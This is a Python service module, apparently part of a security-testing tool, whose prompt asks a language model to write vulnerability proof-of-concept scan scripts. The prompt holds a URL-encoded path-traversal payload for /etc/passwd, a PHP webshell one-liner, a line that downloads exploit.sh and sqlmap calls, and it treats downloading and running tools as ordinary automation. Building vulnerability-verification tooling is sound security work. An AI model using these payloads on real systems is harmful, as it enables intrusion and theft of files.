"""
大模型服务 - 负责与LLM API交互
"""
from openai import AsyncOpenAI
from typing import Optional, Dict
from config import settings
import json
import logging

# 配置日志
logger = logging.getLogger(__name__)


class LLMService:
    """大模型API调用服务"""

    def __init__(self):
        self.api_key = settings.LLM_API_KEY
        self.api_base = settings.LLM_API_BASE
        self.temperature = settings.LLM_TEMPERATURE
        self.max_tokens = settings.LLM_MAX_TOKENS
        self.model = settings.LLM_MODEL_GENERATE  # 生成模型

        # 初始化 AsyncOpenAI 客户端（兼容硅基流动API）
        self.client = AsyncOpenAI(
            api_key=self.api_key,
            base_url=self.api_base
        )

    async def generate_initial_poc(
        self, vulnerability_info: str, target_info: Optional[str] = None
    ) -> Dict[str, Optional[str]]:
        """
        使用 GLM-4.6 生成POC代码或人工操作指南

        Args:
            vulnerability_info: 漏洞信息（描述、数据包、CVE等）
            target_info: 目标系统信息（可选）

        Returns:
            包含verifiable、poc_code或manual_steps等的字典
        """
        try:
            # 构建prompt
            prompt = self._build_prompt(vulnerability_info, target_info)

            # 调用 GLM-4.6 API
            response = await self._call_llm_api(prompt)

            # 返回完整的响应（包含verifiable字段）
            return {
                "verifiable": response.get("verifiable", True),
                "vulnerability_type": response.get("vulnerability_type"),
                "original_vulnerability_info": response.get("original_vulnerability_info"),
                "poc_code": response.get("poc_code"),
                "manual_steps": response.get("manual_steps"),
                "explanation": response.get("explanation"),
            }

        except Exception as e:
            raise Exception(f"生成POC代码失败: {str(e)}")

    def _build_prompt(self, vulnerability_info: str, target_info: Optional[str]) -> str:
        """构建发送给大模型的提示词"""
        target_section = (
            f"\n目标系统信息：{target_info}\n" if target_info else ""
        )

        prompt = f"""你是Web安全专家，专注漏洞验证脚本编写。

⚠️ 仅用于授权安全测试，不得包含攻击性行为。

## 漏洞信息
{vulnerability_info}
{target_section}

## 任务

**步骤1：判断能否用Python脚本自动化验证**

🎯 **核心判断标准：整个验证过程能否由脚本自动完成，无需人工干预**

✅ **以下情况都算可自动化：**
- 可以使用任何Python库（requests、selenium、paramiko等），可在脚本中pip安装
- 可以在脚本中创建文件、写入配置、生成payload文件
- 可以在脚本中下载工具、下载依赖文件
- 可以通过subprocess调用系统命令、执行外部工具（如nmap、sqlmap、nuclei）
- 可以启动临时服务、配置环境变量、修改系统设置
- 可以使用Selenium自动化浏览器操作
- 可以连接数据库、SSH远程执行命令
- 总之：只要脚本能自己完成，就算自动化

❌ **只有以下情况算不可自动化：**
- 需要人工点击、拖拽、输入（无法用脚本模拟的交互）
- 需要人工识别验证码（非简单图形验证码）
- 需要人工判断复杂的业务逻辑结果
- 需要物理设备操作（如插拔硬件）
- 需要人工审批、等待外部系统响应

**步骤2：根据判断返回内容**

### A. 可自动化 - 返回POC代码

**函数要求：**
```python
def scan(url):  # url已标准化为 http(s)://host:port/
    # 验证逻辑（可以包含任何自动化操作）
    # 示例自动化操作：
    # - 创建临时文件：open('/tmp/payload.txt', 'w').write(data)
    # - 下载工具：subprocess.run(['wget', 'http://...'])
    # - 安装依赖：subprocess.run(['pip', 'install', 'package'])
    # - 调用外部工具：subprocess.run(['sqlmap', '-u', url])
    # - 启动浏览器：from selenium import webdriver; driver = webdriver.Chrome()
    # - SSH连接：import paramiko; ssh.connect(host, username, password)

    return {{
        "vulnerable": True/False,
        "reason": "判断依据",
        "details": "详细信息"
    }}
```

**💡 脚本可以完成的自动化操作示例：**
```python
# 1. 创建配置文件
with open('config.ini', 'w') as f:
    f.write('[settings]\\nhost=example.com')

# 2. 下载payload文件
import urllib.request
urllib.request.urlretrieve('http://example.com/exploit.sh', 'exploit.sh')

# 3. 调用系统工具
import subprocess
subprocess.run(['nmap', '-p', '80,443', target])

# 4. 自动化浏览器
from selenium import webdriver
driver = webdriver.Chrome()
driver.get(url)

# 5. 动态安装依赖
subprocess.run(['pip', 'install', 'paramiko', '-q'])
```

**🚨 URL处理关键（目录遍历必看）：**
```python
# ❌ 错误：requests会自动规范化路径
payload = '/static/../../../etc/passwd'
full_url = url.rstrip('/') + payload
# 实际发送: http://example.com/etc/passwd (../被清理)

# ✅ 正确：URL编码绕过规范化
payload = '/static/%2e%2e/%2e%2e/%2e%2e/etc/passwd'  # %2e=点 %2f=斜杠
full_url = url.rstrip('/') + payload
# 实际发送: http://example.com/static/%2e%2e/%2e%2e/%2e%2e/etc/passwd
```

**返回格式：**
```json
{{
  "verifiable": true,
  "vulnerability_type": "漏洞类型",
  "original_vulnerability_info": "原始信息",
  "poc_code": "完整scan函数代码（不要用JSON字符串包裹，直接是Python代码）",
  "explanation": "逻辑说明"
}}
```

**⚠️ 重要：poc_code必须是Python代码字符串，不是JSON！**

### B. 不可自动化 - 返回人工操作指南

**必须包含：**

1. **required_tools**: 工具列表（名称、版本、下载地址、安装命令、用途）
2. **steps**: 操作步骤（step_number、title、description、commands[]、expected_result、notes）
3. **verification**: 成功/失败指标、示例输出

**返回格式：**
```json
{{
  "verifiable": false,
  "vulnerability_type": "类型",
  "original_vulnerability_info": "原始信息",
  "manual_steps": {{
    "required_tools": [
      {{"name": "Burp Suite", "version": "2023+", "download_url": "https://...", "install_command": null, "purpose": "拦截HTTP请求"}}
    ],
    "steps": [
      {{"step_number": 1, "title": "配置代理", "description": "打开Burp...", "commands": [], "expected_result": "流量被拦截", "notes": "注意事项"}}
    ],
    "verification": {{
      "success_indicators": ["返回200", "包含admin数据"],
      "failure_indicators": ["返回403", "Access Denied"],
      "example_output": "HTTP/1.1 200 OK\\n{{'role': 'admin'}}"
    }}
  }},
  "explanation": "需要Burp拦截修改请求"
}}
```

## 示例

**示例1：可自动化（SQL注入-简单HTTP请求）：**
```json
{{"verifiable": true, "vulnerability_type": "SQL注入", "poc_code": "import requests\\ndef scan(url): ...", "explanation": "单引号检测MySQL错误"}}
```

**示例2：可自动化（需要调用sqlmap工具）：**
```json
{{"verifiable": true, "vulnerability_type": "SQL注入（深度检测）", "poc_code": "import subprocess\\nimport json\\ndef scan(url):\\n    result = subprocess.run(['sqlmap', '-u', url, '--batch', '--json'], capture_output=True)\\n    ...", "explanation": "脚本自动调用sqlmap工具完成深度检测"}}
```

**示例3：可自动化（需要Selenium浏览器自动化）：**
```json
{{"verifiable": true, "vulnerability_type": "XSS存储型", "poc_code": "from selenium import webdriver\\ndef scan(url):\\n    driver = webdriver.Chrome()\\n    driver.get(url)\\n    ...", "explanation": "使用Selenium自动化浏览器操作，验证XSS"}}
```

**示例4：可自动化（需要创建文件+下载工具）：**
```json
{{"verifiable": true, "vulnerability_type": "文件上传漏洞", "poc_code": "import os\\nimport subprocess\\ndef scan(url):\\n    # 创建webshell文件\\n    with open('shell.php', 'w') as f:\\n        f.write('<?php system($_GET[\"cmd\"]); ?>')\\n    ...", "explanation": "脚本自动创建payload文件并上传验证"}}
```

**示例5：不可自动化（需要人工识别图形验证码）：**
```json
{{"verifiable": false, "vulnerability_type": "登录爆破", "manual_steps": {{"required_tools": [...], "steps": [...], "verification": {{...}}}}, "explanation": "需要人工识别复杂图形验证码，无法自动化"}}
```

**示例6：不可自动化（需要人工审批流程）：**
```json
{{"verifiable": false, "vulnerability_type": "权限提升", "manual_steps": {{"required_tools": [...], "steps": [...], "verification": {{...}}}}, "explanation": "需要管理员人工审批，无法通过脚本模拟"}}
```

**🎯 记住：只要脚本能自己完成整个验证过程，就返回POC代码（verifiable=true）。严格按JSON格式返回。**
"""
        return prompt

    async def _call_llm_api(self, prompt: str, model: str = None) -> Dict[str, str]:
        """
        调用大模型API（使用OpenAI SDK）- 返回JSON格式

        支持OpenAI兼容的API接口（如硅基流动）
        """
        if model is None:
            model = self.model

        try:
            logger.info("=" * 60)
            logger.info("开始调用大模型API")
            logger.info(f"API Base: {self.api_base}")
            logger.info(f"Model: {model}")
            logger.info(f"Temperature: {self.temperature}")
            logger.info(f"Max Tokens: {self.max_tokens}")
            logger.info(f"Prompt 长度: {len(prompt)} 字符")

            # 使用 OpenAI SDK 调用 API
            logger.info("正在发送请求到大模型...")

            # 构建API参数
            api_params = {
                "model": model,
                "messages": [
                    {
                        "role": "system",
                        "content": "你是一个专业的Web安全研究专家，精通Web应用程序漏洞分析和POC编写。请严格按照JSON格式返回结果，并确保在返回的JSON中包含用户提供的原始漏洞信息。",
                    },
                    {"role": "user", "content": prompt},
                ],
                "temperature": self.temperature,
            }

            # 只在max_tokens不为None时添加该参数
            if self.max_tokens is not None:
                api_params["max_tokens"] = self.max_tokens

            response = await self.client.chat.completions.create(**api_params)

            logger.info("✅ 成功收到大模型响应")

            # 提取响应内容
            content = response.choices[0].message.content
            logger.info(f"响应内容长度: {len(content)} 字符")
            logger.debug(f"响应内容预览: {content[:200]}...")

            # 尝试解析JSON响应
            try:
                # 先尝试清理可能存在的markdown代码块标记
                cleaned_content = content.strip()
                if cleaned_content.startswith("```json"):
                    cleaned_content = cleaned_content[7:]
                if cleaned_content.startswith("```"):
                    cleaned_content = cleaned_content[3:]
                if cleaned_content.endswith("```"):
                    cleaned_content = cleaned_content[:-3]
                cleaned_content = cleaned_content.strip()

                parsed_content = json.loads(cleaned_content)

                # 清理poc_code字段中可能存在的markdown代码块标记
                if "poc_code" in parsed_content and parsed_content["poc_code"]:
                    poc_code = parsed_content["poc_code"].strip()
                    # 移除开头的代码块标记
                    if poc_code.startswith("```python"):
                        poc_code = poc_code[9:]
                    elif poc_code.startswith("```"):
                        poc_code = poc_code[3:]
                    # 移除结尾的代码块标记
                    if poc_code.endswith("```"):
                        poc_code = poc_code[:-3]
                    parsed_content["poc_code"] = poc_code.strip()

                logger.info("✅ JSON解析成功")
                logger.info("=" * 60)
                return parsed_content
            except json.JSONDecodeError as json_err:
                logger.warning(f"JSON解析失败: {str(json_err)}")
                logger.info("将整个响应作为 poc_code 返回")
                logger.info("=" * 60)
                # 如果不是JSON格式，将整个内容作为poc_code返回
                return {
                    "poc_code": content,
                    "explanation": "代码已生成，请仔细审查后使用。",
                }

        except Exception as e:
            # 提供更详细的错误信息
            error_type = type(e).__name__
            error_msg = str(e)

            logger.error("=" * 60)
            logger.error(f"❌ API调用失败")
            logger.error(f"异常类型: {error_type}")
            logger.error(f"错误详情: {error_msg}")

            # 如果是 OpenAI SDK 的异常，提供更多信息
            if hasattr(e, 'response'):
                logger.error(f"HTTP状态码: {getattr(e.response, 'status_code', 'N/A')}")
                logger.error(f"响应内容: {getattr(e.response, 'text', 'N/A')[:500]}")

            logger.error("=" * 60)

            raise Exception(f"API调用异常: {error_type} - {error_msg}")


# 创建全局服务实例
llm_service = LLMService()